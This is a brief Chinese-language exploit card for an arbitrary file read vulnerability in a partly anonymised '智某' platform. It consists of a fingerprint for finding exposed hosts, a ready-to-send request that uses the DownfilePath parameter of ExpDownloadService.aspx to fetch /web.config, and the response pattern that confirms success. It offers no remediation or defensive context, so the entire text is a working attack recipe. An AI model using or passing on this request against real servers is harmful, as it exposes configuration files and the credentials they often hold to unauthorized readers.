# 智某平台DownfilePath存在任意文件读取漏洞

智某平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="custom/blue/uimaker/easyui.css"`
- **请求**：`GET /ExpDownloadService.aspx?DownfilePath=/web.config HTTP/1.1`
- **响应特征**：200 <?xml version=”1.0”